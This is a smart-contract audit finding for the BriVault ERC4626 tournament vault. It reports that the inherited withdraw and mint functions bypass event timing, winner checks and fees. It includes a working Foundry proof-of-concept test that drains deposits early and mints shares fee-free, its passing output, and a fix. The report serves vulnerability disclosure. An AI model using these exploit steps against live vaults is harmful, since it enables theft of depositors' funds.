# Finding Title

ERC4626 public withdraw/mint paths bypass tournament rules and fee logic

## Root + Impact

- Root: BriVault inherits ERC4626 without overriding `withdraw(redeem)` and `mint`, leaving unrestricted base flows.
- Impact: Any user can withdraw assets before event end and without winner, or mint shares after event start without paying participation fees or recording `stakedAsset`. This breaks tournament invariants, causes solvency and fairness violations.

## Description

- Normal behavior: Deposits charge a participation fee and are time-gated before `eventStartDate`; withdrawals should only be allowed to winners after `eventEndDate` with pro-rata distribution using `finalizedVaultAsset` and `totalWinnerShares`.
- Issue: The inherited ERC4626 `withdraw(assets, receiver, owner)` and `mint(shares, receiver)` remain publicly callable and do not enforce tournament time checks, winner checks, or fees.

```solidity
// BriVault.sol
// @> BriVault does not override ERC4626.withdraw/mint/redeem, leaving them callable.
function deposit(uint256 assets, address receiver) public override returns (uint256) {
    if (block.timestamp >= eventStartDate) { revert eventStarted(); }
    uint256 fee = _getParticipationFee(assets);
    // ... fee charged, staked recorded, shares minted
}

// OpenZeppelin ERC4626.sol
function withdraw(uint256 assets, address receiver, address owner) public virtual returns (uint256) {
    uint256 shares = previewWithdraw(assets);
    _withdraw(_msgSender(), receiver, owner, assets, shares);
}

function mint(uint256 shares, address receiver) public virtual returns (uint256) {
    uint256 assets = previewMint(shares);
    _deposit(_msgSender(), receiver, assets, shares);
}
```

## Risk

- Likelihood: High
  - Occurs whenever a user calls `withdraw()` during the event or before winner set.
  - Occurs whenever a user calls `mint()` after `eventStartDate`, avoiding fee and tracking.
- Impact: Critical
  - Users can arbitrarily drain vault assets pre-event or non-winners can exit, breaking distribution logic.
  - Users can add funds post-start without fees, skewing share accounting and fairness.

## Proof of Concept

```solidity
// test/AuditPoC.t.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";
import {BriVault} from "../src/briVault.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {MockERC20} from "./MockErc20.t.sol";

contract AuditPoCTest is Test {
    uint256 public participationFeeBsp;
    uint256 public eventStartDate;
    uint256 public eventEndDate;
    address public participationFeeAddress;
    uint256 public minimumAmount;

    BriVault public briVault;
    MockERC20 public mockToken;

    address owner = makeAddr("owner");
    address user1 = makeAddr("user1");
    address user2 = makeAddr("user2");
    address user3 = makeAddr("user3");

    string[48] countries = [
        "United States", "Canada", "Mexico", "Argentina", "Brazil", "Ecuador",
        "Uruguay", "Colombia", "Peru", "Chile", "Japan", "South Korea",
        "Australia", "Iran", "Saudi Arabia", "Qatar", "Uzbekistan", "Jordan",
        "France", "Germany", "Spain", "Portugal", "England", "Netherlands",
        "Italy", "Croatia", "Belgium", "Switzerland", "Denmark", "Poland",
        "Serbia", "Sweden", "Austria", "Morocco", "Senegal", "Nigeria",
        "Cameroon", "Egypt", "South Africa", "Ghana", "Algeria", "Tunisia",
        "Ivory Coast", "New Zealand", "Costa Rica", "Panama", "United Arab Emirates", "Iraq"
    ];

    function setUp() public {
        participationFeeBsp = 150; // 1.5%
        eventStartDate = block.timestamp + 2 days;
        eventEndDate = eventStartDate + 31 days;
        participationFeeAddress = makeAddr("participationFeeAddress");
        minimumAmount = 0.0002 ether;

        mockToken = new MockERC20("Mock Token", "MTK");

        // Mint balances
        mockToken.mint(owner, 100 ether);
        mockToken.mint(user1, 100 ether);
        mockToken.mint(user2, 100 ether);
        mockToken.mint(user3, 100 ether);

        vm.startPrank(owner);
        briVault = new BriVault(
            IERC20(address(mockToken)),
            participationFeeBsp,
            eventStartDate,
            participationFeeAddress,
            minimumAmount,
            eventEndDate
        );
        vm.stopPrank();
    }
    /// PoC-1: ERC4626 withdraw bypasses tournament rules (time & winner checks)
    function test_poc1_erc4626_withdraw_bypass_lock() public {
        // Arrange: set countries
        vm.prank(owner);
        briVault.setCountry(countries);

        // User1 deposits and joins a non-winner country
        vm.startPrank(user1);
        mockToken.approve(address(briVault), type(uint256).max);
        uint256 shares = briVault.deposit(5 ether, user1);
        briVault.joinEvent(10); // Japan (index 10)
        vm.stopPrank();

        // Event starts, but not ended, and winner not set
        vm.warp(eventStartDate + 1);

        // Act: user1 calls ERC4626.withdraw() with 3-arg signature
        vm.startPrank(user1);
        uint256 maxAssets = briVault.maxWithdraw(user1);
        uint256 balBefore = mockToken.balanceOf(user1);
        uint256 vaultBefore = mockToken.balanceOf(address(briVault));
        uint256 burnedShares = briVault.withdraw(maxAssets, user1, user1);
        vm.stopPrank();

        // Assert: withdraw succeeded even though event not ended & no winner set
        assertEq(burnedShares, briVault.previewWithdraw(maxAssets), "burned shares should match preview");
        assertEq(mockToken.balanceOf(user1), balBefore + maxAssets, "user should receive assets");
        assertEq(mockToken.balanceOf(address(briVault)), vaultBefore - maxAssets, "vault assets decreased");
        assertEq(briVault.balanceOf(user1), 0, "shares burned");
    }

    /// PoC-2: ERC4626 mint allows depositing after event start with no fee
    function test_poc2_erc4626_mint_bypass_fee_and_time() public {
        // Event already started
        vm.warp(eventStartDate + 5);

        // User2 can mint shares directly (no fee, bypasses tournament deposit rules)
        vm.startPrank(user2);
        mockToken.approve(address(briVault), type(uint256).max);
        uint256 sharesToMint = 1e18; // 1 share (18 decimals)
        uint256 assetsRequired = briVault.previewMint(sharesToMint);
        uint256 userBalBefore = mockToken.balanceOf(user2);
        uint256 vaultBalBefore = mockToken.balanceOf(address(briVault));
        uint256 assetsSpent = briVault.mint(sharesToMint, user2);
        vm.stopPrank();

        assertEq(assetsRequired, assetsSpent, "assets spent should equal previewMint");
        assertEq(mockToken.balanceOf(user2), userBalBefore - assetsSpent, "user paid assets");
        assertEq(mockToken.balanceOf(address(briVault)), vaultBalBefore + assetsSpent, "vault received assets");
        // No stakedAsset recorded via ERC4626 path
        assertEq(briVault.stakedAsset(user2), 0, "stakedAsset not recorded");
    }
}
```

**test result:**

```bash
➜  2025-11-brivault git:(main) ✗ forge test -vv --match-path test/AuditPoC.t.sol

Ran 2 tests for test/AuditPoC1.t.sol:AuditPoCTest
[PASS] test_poc1_erc4626_withdraw_bypass_lock() (gas: 1636580)
[PASS] test_poc2_erc4626_mint_bypass_fee_and_time() (gas: 150320)
Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 3.14ms (1.62ms CPU time)
```

## Recommended Mitigation

```diff
- // leave ERC4626 withdraw/mint as-is
+ // Override ERC4626 flows to enforce tournament rules
+ function withdraw(uint256 assets, address receiver, address owner) public override returns (uint256) {
+     revert("use tournament withdraw");
+ }
+ function redeem(uint256 shares, address receiver, address owner) public override returns (uint256) {
+     revert("use tournament withdraw");
+ }
+ function mint(uint256 shares, address receiver) public override returns (uint256) {
+     revert("use tournament deposit");
+ }
```

Alternatively, implement internal hooks to align preview/max functions with tournament state and apply fees consistently.
